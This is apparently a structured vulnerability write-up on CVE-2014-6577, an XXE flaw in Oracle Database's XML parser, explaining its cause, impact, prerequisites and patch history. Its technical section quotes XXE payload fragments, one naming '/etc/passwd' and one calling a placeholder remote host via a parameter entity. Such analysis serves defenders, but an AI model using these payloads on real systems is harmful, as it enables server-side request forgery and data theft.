Based on the provided information, here's an analysis of CVE-2014-6577:

**Root Cause of Vulnerability:**

*   The vulnerability lies in the XML Parser module of the Oracle Database. It is susceptible to XML External Entity (XXE) Injection.

**Weaknesses/Vulnerabilities Present:**

*   **XXE Injection:** The core issue is that the XML parser processes external entities defined in XML documents. Even though the parser does not parse external files, it still attempts to resolve external schemas. This can be exploited to force the server to initiate connections to remote resources via HTTP or FTP.
*   **Unrestricted Access:** The vulnerability can be exploited by any database user with the `CREATE SESSION` privilege, which is a basic level of access.
*   **Bypass of UTL\_HTTP Restrictions:** The `extractvalue()` function, which is used to trigger the vulnerability, bypasses the typical restrictions that require the `UTL_HTTP` package to make external HTTP requests.

**Impact of Exploitation:**

*   **Data Exfiltration:** Attackers can exfiltrate data from the database server by directing it to an attacker controlled server.
*   **Port Scanning:** The vulnerability enables attackers to perform port scanning on remote internal systems.
*   **Server-Side Request Forgery (SSRF):** Attackers can use the vulnerable server to make requests to other internal or external systems.
*   **Denial of Service (DoS):** By forcing numerous requests to external systems or malformed requests, attackers can cause a DoS on the vulnerable server.

**Attack Vectors:**

*   **SQL Injection:** The vulnerability is triggered through a specially crafted SQL query that includes malicious XML.
*   **HTTP/FTP URI Handlers:** The parser can be tricked into connecting to external resources by including HTTP or FTP URI handlers in the XML.
*   **XML Payload:**  The payload exploits the parameter entity to make the server initiate the request.

**Required Attacker Capabilities/Position:**

*   **Database Access:** The attacker must have the ability to execute SQL queries against a vulnerable Oracle Database instance, requiring at least a valid database user with `CREATE SESSION` privilege.
*   **Network Access:** The attacker needs to be able to receive connections from the vulnerable database server.

**Technical Details:**

*   The vulnerability is triggered using the `extractvalue()` function with an `xmltype` object.
*   A standard XXE payload attempting to read a local file will be blocked (e.g., `<!ENTITY xxe SYSTEM "file:///etc/passwd">`), as the `file://` URI is converted to an XDB repository path.
*   However, using `http://` or `ftp://` URI handlers will cause the server to attempt to connect to the remote resource.
*   Using parameter entities instead of document entities triggers the external request: `<!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://IP/test"> %remote; %param1;]>`

**Additional Information:**

*   The vulnerability was reported to Oracle on July 3, 2014, and a patch was released on January 20, 2015.
*   Affected versions of Oracle Database are: 11.2.0.3, 11.2.0.4, 12.1.0.1, and 12.1.0.2.
*   The vulnerability affects the `XML Developer's Kit for C` component
